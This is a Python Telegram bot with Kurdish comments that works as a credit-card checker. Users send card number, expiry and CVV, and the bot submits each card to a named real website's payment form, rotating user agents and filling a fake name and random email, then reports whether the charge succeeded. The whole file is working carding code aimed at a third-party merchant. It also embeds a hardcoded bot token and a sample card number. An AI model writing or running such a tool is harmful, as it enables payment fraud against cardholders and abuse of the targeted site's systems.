#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import telebot
import requests
import time
import logging
import re
import random
from bs4 import BeautifulSoup

# ڕێکخستنی لۆگکردن
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# تۆکێنی بۆتی تێلێگرام - ئەمە بگۆڕە بە تۆکێنی خۆت
BOT_TOKEN = "7018443911:AAGuZfbkaQc-s2icbMpljkjokKkzg_azkYI"

bot = telebot.TeleBot(BOT_TOKEN)

# وێبسایتی ئامانج
TARGET_URL = "https://www.englishteachervault.com/trial"

# سیشنێکی ڕیکوێست بۆ پاراستنی کوکیەکان
session = requests.Session()

# فەنکشنێک بۆ پاراستنی user-agent جیاواز
def get_random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
    ]
    return random.choice(user_agents)

# فەنکشنی چێککردنی کرێدیت کارد لە وێبسایت
def check_credit_card(card_number, exp_month, exp_year, cvv):
    try:
        headers = {
            "User-Agent": get_random_user_agent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Referer": TARGET_URL,
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        }
        
        # سەردانی سەرەتایی وێبسایت بۆ وەرگرتنی کوکی و تۆکێن
        response = session.get(TARGET_URL, headers=headers)
        soup = BeautifulSoup(response.text, "html.parser")
        
        # دۆزینەوەی فۆرم و تۆکێنەکانی
        form = soup.find("form", {"id": "payment-form"})
        if not form:
            return {"status": "error", "message": "فۆرمی پارەدان نەدۆزرایەوە"}
        
        # دۆزینەوەی تۆکێنی فۆرم (ئەگەر هەبێت)
        token_input = form.find("input", {"name": "_token"})
        form_token = token_input["value"] if token_input else ""
        
        # ئامادەکردنی داتا بۆ ناردن
        form_data = {
            "_token": form_token,
            "card_number": card_number,
            "exp_month": exp_month,
            "exp_year": exp_year,
            "cvc": cvv,
            "name": "John Doe",  # ناوێکی جێگیر
            "email": f"test{random.randint(1000, 9999)}@example.com",  # ئیمەیڵێکی هەڕەمەکی
        }
        
        # ناردنی فۆرم
        post_headers = headers.copy()
        post_headers["Content-Type"] = "application/x-www-form-urlencoded"
        post_headers["Origin"] = "https://www.englishteachervault.com"
        
        response = session.post(TARGET_URL, data=form_data, headers=post_headers, allow_redirects=True)
        
        # شیکردنەوەی وەڵام
        if "success" in response.url.lower() or "thank" in response.url.lower():
            return {"status": "success", "message": "کرێدیت کارد سەرکەوتوو بوو! ✅"}
        
        # شیکردنەوەی هەڵەکان
        soup = BeautifulSoup(response.text, "html.parser")
        error_msg = soup.find("div", {"class": "alert-danger"})
        if error_msg:
            error_text = error_msg.text.strip()
            return {"status": "error", "message": f"هەڵە: {error_text}"}
        
        # ئەگەر هەڵەیەکی تایبەت نەبوو
        if response.status_code != 200:
            return {"status": "error", "message": f"هەڵەی سێرڤەر: کۆدی {response.status_code}"}
        
        return {"status": "unknown", "message": "ئەنجامی نادیار. تکایە دووبارە هەوڵبدەوە."}
    
    except Exception as e:
        logger.error(f"هەڵە لە کاتی چێککردنی کارت: {str(e)}")
        return {"status": "error", "message": f"هەڵەی سیستەم: {str(e)}"}

# کۆماندی سەرەتا
@bot.message_handler(commands=['start'])
def start_command(message):
    bot.reply_to(message, 
                "بەخێربێیت بۆ بۆتی چێککردنی کرێدیت کارد!\n\n"
                "تەنها ژمارەی کرێدیت کارد، مانگ، ساڵ و CVV بنێرە بەم شێوەیە:\n"
                "ژمارەی_کارت|مانگ|ساڵ|CVV\n\n"
                "نموونە:\n"
                "`5548275013486663|08|2022|158`\n"
                "یان\n"
                "`5548275013486663|08|22|158`")

# کۆماندی یارمەتی
@bot.message_handler(commands=['help'])
def help_command(message):
    bot.reply_to(message, 
                "🔹 شێوازی چێککردنی کارت:\n"
                "ژمارەی_کارت|مانگ|ساڵ|CVV\n\n"
                "🔹 نموونە:\n"
                "`5548275013486663|08|2022|158`\n"
                "یان\n"
                "`5548275013486663|08|22|158`")

# وەرگرتنی کرێدیت کارد بە فۆرماتی داواکراو
@bot.message_handler(func=lambda message: bool(re.match(r'^\d+\|\d+\|\d+\|\d+$', message.text)))
def check_card_message(message):
    # جیاکردنەوەی زانیاریەکانی کارت
    card_parts = message.text.split('|')
    if len(card_parts) != 4:
        bot.reply_to(message, "تکایە داتای کارت بە دروستی بنووسە لەم فۆرماتە:\n`ژمارەی_کارت|مانگ|ساڵ|CVV`")
        return
    
    card_number = card_parts[0].strip()
    exp_month = card_parts[1].strip()
    exp_year = card_parts[2].strip()
    cvv = card_parts[3].strip()
    
    # ڕێکخستنی ساڵ (ئەگەر دوو ژمارەیی بێت)
    if len(exp_year) == 2:
        exp_year = "20" + exp_year
    
    # نیشاندانی پەیامێک کە چێککردن بەڕێوەیە
    wait_message = bot.reply_to(message, "تکایە چاوەڕێ بکە، چێککردنی کارت بەڕێوەیە... ⏳")
    
    # چێککردنی کارت
    result = check_credit_card(card_number, exp_month, exp_year, cvv)
    
    # نیشاندانی ئەنجام
    if result["status"] == "success":
        response_text = f"✅ سەرکەوتوو\n\n🔹 کارت: `{card_number}`\n🔹 بەسەرچوون: {exp_month}/{exp_year}\n🔹 CVV: {cvv}\n\n{result['message']}"
    else:
        response_text = f"❌ سەرکەوتوو نەبوو\n\n🔹 کارت: `{card_number}`\n🔹 بەسەرچوون: {exp_month}/{exp_year}\n🔹 CVV: {cvv}\n\n{result['message']}"
    
    # دەستکاریکردنی پەیامی چاوەڕوانی بۆ ئەنجامی کۆتایی
    bot.edit_message_text(response_text, message.chat.id, wait_message.message_id)

# فەنکشنی سەرەکی بۆت
def main():
    logger.info("بۆت دەستی بە کارکردن کرد...")
    try:
        bot.infinity_polling()
    except Exception as e:
        logger.error(f"هەڵە لە بۆت: {str(e)}")

# خاڵی دەستپێکردن
if __name__ == "__main__":
    main()